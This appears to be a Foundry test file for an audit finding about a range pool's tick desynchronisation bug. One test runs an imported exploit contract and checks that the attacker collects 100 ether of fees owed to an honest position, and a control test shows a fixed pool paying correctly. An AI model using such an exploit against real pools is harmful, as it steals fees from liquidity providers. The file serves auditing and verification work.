// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    FeeToken,
    RangePoolFixed
} from "./62812-h-5-rangepooladjusttotick-desyncs-when-nexttick-tick-leading.sol";

contract Finding62812Test is Test {
    function test_exploit_pays_the_out_of_range_position() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.landed(), 60, "tick");
        assertFalse(e.pool().crossed(), "crossed");
        assertEq(e.fees().balanceOf(address(e)), 100 ether, "attacker");
        assertEq(e.fees().balanceOf(e.HONEST()), 0, "honest");
        emit log_named_uint("wrong fee", e.fees().balanceOf(address(e)));
    }

    function test_control_crosses_and_pays_the_in_range_position() public {
        FeeToken fees = new FeeToken();
        RangePoolFixed pool = new RangePoolFixed();
        address honest = address(0xBEEF);
        address attacker = address(0xA77);
        pool.configure(fees, honest, attacker);
        pool.onSwap(60);
        assertEq(pool.tick(), 59, "tick order");
        assertTrue(pool.crossed(), "crossed");
        assertLt(pool.tick(), int24(60), "below boundary");
        pool.pay(100 ether);
        assertEq(fees.balanceOf(honest), 100 ether, "honest paid N");
        assertEq(fees.balanceOf(attacker), 0, "attacker paid 0");
    }
}
